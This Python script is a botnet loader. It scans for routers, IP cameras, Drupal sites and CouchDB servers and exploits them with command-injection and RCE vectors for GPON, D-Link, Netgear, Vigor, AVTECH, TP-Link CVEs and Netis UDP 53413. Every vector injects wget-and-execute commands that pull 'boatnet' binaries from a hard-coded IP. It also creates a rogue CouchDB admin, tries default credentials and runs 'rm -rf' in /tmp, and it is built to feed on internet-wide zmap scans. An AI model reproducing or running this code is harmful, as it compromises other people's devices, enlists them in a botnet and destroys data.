#!/usr/bin/env python3
# HTTP-based Bot Loader - NO TELNET Required!
# Works on ports: 80, 8080, 8000-8999, 5984 + UDP 53413
# Targets: GPON, D-Link, Netgear, Vigor, AVTECH, Drupal, CouchDB, TP-Link, Netis

import sys, requests, threading, time, ssl, socket, random, base64
from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# BOATNET SERVER CONFIG
payload_server = "84.200.81.239"
payload_path = "/hiddenbin/"

# Multi-architecture payloads  
payloads = {
    'mips': f'wget http://{payload_server}{payload_path}boatnet.mips -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot',
    'mipsel': f'wget http://{payload_server}{payload_path}boatnet.mpsl -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot', 
    'arm': f'wget http://{payload_server}{payload_path}boatnet.arm -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot',
    'arm7': f'wget http://{payload_server}{payload_path}boatnet.arm7 -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot',
    'x86': f'wget http://{payload_server}{payload_path}boatnet.x86 -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot',
    'ppc': f'wget http://{payload_server}{payload_path}boatnet.ppc -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot'
}

def create_session():
    session = requests.Session()
    session.verify = False
    session.timeout = 5
    return session

class HTTPExploit(threading.Thread):
    def __init__(self, target):
        threading.Thread.__init__(self)
        self.target = target.strip()
        self.session = create_session()
        
    def run(self):
        # Try ALL exploit vectors (expanded from R00tS3c repo analysis)
        self.gpon_exploit()           # GPON routers (working)
        self.dlink_exploit()          # D-Link setup.cgi (working)
        self.netgear_exploit()        # Netgear routers (working)
        self.vigor_exploit()          # Vigor routers (working)
        self.avtech_exploit()         # 🔥 AVTECH IP cameras (NEW)
        self.drupal_exploit()         # 🔥 Drupal CMS sites (NEW)
        self.couchdb_exploit()        # 🔥 CouchDB databases (NEW)
        self.tplink_cve_2023_1389()  # 🔥 TP-Link CVE-2023-1389 (NEW)
        self.tplink_cve_2024_53375() # 🔥 TP-Link CVE-2024-53375 (NEW)
        self.netis_udp_exploit()     # 🔥 Netis UDP 53413 (NEW)
        self.generic_cgi_exploit()   # Generic vectors
        
    def gpon_exploit(self):
        """GPON Router Exploit (Port 80)"""
        try:
            for arch, payload in payloads.items():
                target_url = f"http://{self.target}/GponForm/diag_Form?images/"
                exploit_data = f"XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`{payload}`&ipv=0"
                
                self.session.post(target_url, data=exploit_data, timeout=3)
                print(f"[GPON] Sent {arch} payload -> {self.target}")
        except: pass
            
    def dlink_exploit(self):
        """D-Link Setup.cgi Exploit (Ports 80, 8080)"""
        try:
            for arch, payload in payloads.items():
                for port in [80, 8080]:
                    target_url = f"http://{self.target}:{port}/setup.cgi"
                    params = {
                        'next_file': 'netsts.cfg',
                        'todo': 'syscmd', 
                        'cmd': payload,
                        'curpath': '/',
                        'currentsetting.htm': '1'
                    }
                    
                    self.session.get(target_url, params=params, timeout=3)
                    print(f"[DLINK] Sent {arch} payload -> {self.target}:{port}")
        except: pass
            
    def netgear_exploit(self):
        """Netgear Command Injection (Port 80)"""
        try:
            for arch, payload in payloads.items():
                target_url = f"http://{self.target}/setup.cgi"
                exploit_data = f"todo=syscmd&cmd={payload}&submit_button=&change_action="
                
                self.session.post(target_url, data=exploit_data, timeout=3)
                print(f"[NETGEAR] Sent {arch} payload -> {self.target}")
        except: pass
            
    def vigor_exploit(self):
        """Vigor Router Exploit (Port 80)"""
        try:
            payload = payloads['arm7']  # Vigor usually ARM7
            target_url = f"http://{self.target}/goform/webLogin" 
            
            # URL encoded payload for Vigor
            encoded_payload = payload.replace(' ', '%20').replace('&', '%26')
            exploit_data = f"action=login&username=admin&password=`{encoded_payload}`"
            
            self.session.post(target_url, data=exploit_data, timeout=3)
            print(f"[VIGOR] Sent ARM7 payload -> {self.target}")
        except: pass
            
    def avtech_exploit(self):
        """AVTECH IP Cameras Exploit (Port 80) - From R00tS3c repo"""
        try:
            base_ip = self.target.split(':')[0]
            ports = [80, 8080, 8000]
            
            for port in ports:
                for arch, payload in payloads.items():
                    try:
                        # AVTECH Vector 1: Search.cgi
                        url1 = f"http://{base_ip}:{port}/cgi-bin/nobody/Search.cgi"
                        params1 = {
                            'action': 'cgi_query',
                            'ip': 'google.com', 
                            'port': '80',
                            'queryb64str': 'Lw==',
                            'username': f'admin;XmlAp r Account.User1.Password>$({payload})',
                            'password': 'admin'
                        }
                        self.session.get(url1, params=params1, timeout=3)
                        
                        # AVTECH Vector 2: CloudSetup.cgi  
                        url2 = f"http://{base_ip}:{port}/nobody/ez.htm"
                        params2 = {'a': 'YWRtaW46YWRtaW4=', 'rnd': '0.06814667194551349'}
                        self.session.get(url2, params=params2, timeout=2)
                        
                        url3 = f"http://{base_ip}:{port}/cgi-bin/supervisor/CloudSetup.cgi"
                        params3 = {'exefile': f'{payload}; echo avtech_pwned'}
                        self.session.get(url3, params=params3, timeout=3)
                        
                    except: continue
                        
            print(f"[AVTECH] Sent multi-payload -> {self.target}")
        except: pass
    
    def drupal_exploit(self):
        """Drupal CMS RCE - From R00tS3c repo"""
        try:
            base_ip = self.target.split(':')[0]
            
            for arch, payload in payloads.items():
                try:
                    url = f"http://{base_ip}/user/register"
                    params = {
                        'element_parents': 'account/mail/#value',
                        'ajax_form': '1',
                        '_wrapper_format': 'drupal_ajax'
                    }
                    
                    # Drupal form injection payload
                    data = {
                        'form_id': 'user_register_form',
                        '_drupal_ajax': '1',
                        'mail[#post_render][]': 'exec',
                        'mail[#type]': 'markup',
                        'mail[#markup]': payload
                    }
                    
                    self.session.post(url, params=params, data=data, timeout=4)
                    
                except: continue
                    
            print(f"[DRUPAL] Sent RCE payloads -> {self.target}")
        except: pass
    
    def couchdb_exploit(self):
        """CouchDB RCE (Port 5984) - From R00tS3c repo"""
        try:
            base_ip = self.target.split(':')[0]
            couchdb_url = f"http://{base_ip}:5984"
            
            for arch, payload in payloads.items():
                try:
                    # Create admin user
                    user_data = {
                        "type": "user",
                        "name": "guest", 
                        "roles": ["_admin"],
                        "password": "guest"
                    }
                    
                    self.session.put(f"{couchdb_url}/_users/org.couchdb.user:guest", 
                                   json=user_data, timeout=3)
                    
                    # Set auth
                    self.session.auth = ('guest', 'guest')
                    
                    # Inject payload into query_servers
                    self.session.put(f"{couchdb_url}/_config/query_servers/cmd",
                                   data=f'"{payload}"', timeout=3)
                    
                    # Create database and execute
                    db_name = f"/exploit_{random.randint(1000,9999)}"
                    self.session.put(f"{couchdb_url}{db_name}", timeout=2)
                    self.session.put(f"{couchdb_url}{db_name}/zero", 
                                   json={"_id": "exploit"}, timeout=2)
                    
                    # Execute payload
                    exec_data = {"language": "cmd", "map": ""}
                    self.session.post(f"{couchdb_url}{db_name}/_temp_view?limit=10",
                                    json=exec_data, timeout=3)
                    
                    # Cleanup
                    self.session.delete(f"{couchdb_url}{db_name}", timeout=2)
                    self.session.delete(f"{couchdb_url}/_config/query_servers/cmd", timeout=2)
                    
                except: continue
                    
            print(f"[COUCHDB] Sent RCE payloads -> {base_ip}:5984")
        except: pass
    
    def tplink_cve_2023_1389(self):
        """TP-Link Archer AX21 CVE-2023-1389 (CVSS 9.8)"""
        try:
            base_ip = self.target.split(':')[0]
            
            for arch, payload in payloads.items():
                try:
                    url = f"http://{base_ip}/cgi-bin/luci/;stok=/locale"
                    data = {
                        'form': 'country',
                        'country': f'$({payload})',
                        'action': 'apply'
                    }
                    
                    self.session.post(url, data=data, timeout=4)
                    
                except: continue
                    
            print(f"[TP-LINK-CVE] Sent CVE-2023-1389 -> {self.target}")
        except: pass
    
    def tplink_cve_2024_53375(self):
        """TP-Link Archer CVE-2024-53375 Authenticated RCE"""
        try:
            base_ip = self.target.split(':')[0]
            
            # Try default creds first
            auth_data = {'username': 'admin', 'password': 'admin'}
            
            for arch, payload in payloads.items():
                try:
                    # Login attempt
                    login_url = f"http://{base_ip}/cgi-bin/luci/admin"
                    self.session.post(login_url, data=auth_data, timeout=3)
                    
                    # Exploit ownerid parameter
                    exploit_url = f"http://{base_ip}/cgi-bin/luci/admin/avira"
                    exploit_data = {
                        'ownerid': payload,
                        'action': 'update'
                    }
                    
                    self.session.post(exploit_url, data=exploit_data, timeout=4)
                    
                except: continue
                    
            print(f"[TP-LINK-AUTH] Sent CVE-2024-53375 -> {self.target}")
        except: pass
    
    def netis_udp_exploit(self):
        """Netis Router UDP Port 53413 - From R00tS3c repo"""
        try:
            base_ip = self.target.split(':')[0]
            
            # UDP payload from R00tS3c analysis
            login_payload = b"AAAAAAAAnetcore\x00"
            
            for arch, payload in payloads.items():
                try:
                    cmd_payload = f"AA\x00\x00AAAA cd /tmp; rm -rf *; {payload} \x00".encode()
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(3)
                    
                    # Send login
                    sock.sendto(login_payload, (base_ip, 53413))
                    time.sleep(1)
                    
                    # Send command
                    sock.sendto(cmd_payload, (base_ip, 53413))
                    sock.close()
                    
                except: continue
                    
            print(f"[NETIS-UDP] Sent UDP payloads -> {base_ip}:53413")
        except: pass
            
    def generic_cgi_exploit(self):
        """Generic CGI Exploits (Multiple ports)"""
        try:
            cgi_paths = [
                '/cgi-bin/luci',
                '/cgi-bin/webproc', 
                '/goform/formSetWan',
                '/apply.cgi',
                '/cgi-bin/webcgi'
            ]
            
            for arch, payload in payloads.items():
                for port in [80, 8080, 8000, 8443, 9000]:
                    for path in cgi_paths:
                        try:
                            target_url = f"http://{self.target}:{port}{path}"
                            exploit_data = f"cmd={payload}"
                            
                            self.session.post(target_url, data=exploit_data, timeout=2)
                        except: continue
                            
            print(f"[GENERIC] Sent multi-arch payloads -> {self.target}")
        except: pass

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 http_loader.py <ip_list_file>")
        print("Example: zmap -p 80 0.0.0.0/0 | python3 http_loader.py -")
        sys.exit(1)
        
    # Read IPs from file or stdin
    if sys.argv[1] == '-':
        ips = [line.strip() for line in sys.stdin if line.strip()]
    else:
        with open(sys.argv[1], 'r') as f:
            ips = [line.strip() for line in f if line.strip()]
    
    print(f"[LOADER] Starting HTTP exploitation on {len(ips)} targets...")
    print(f"[CONFIG] Payload server: {payload_server}{payload_path}")
    
    active_threads = 0
    max_threads = 200
    
    for ip in ips:
        # Parse IP:PORT format
        if ':' in ip:
            target_ip = ip
        else:
            target_ip = f"{ip}:80"  # Default to port 80
            
        # Thread limiting
        while active_threads >= max_threads:
            time.sleep(0.1)
            active_threads = sum(1 for t in threading.enumerate() if isinstance(t, HTTPExploit))
            
        # Launch exploit
        exploit = HTTPExploit(target_ip)
        exploit.daemon = True
        exploit.start()
        active_threads += 1
        
        time.sleep(0.05)  # Rate limiting
    
    # Wait for completion
    while any(isinstance(t, HTTPExploit) for t in threading.enumerate()):
        time.sleep(1)
        
    print("[LOADER] HTTP exploitation completed!")

if __name__ == "__main__":
    main()
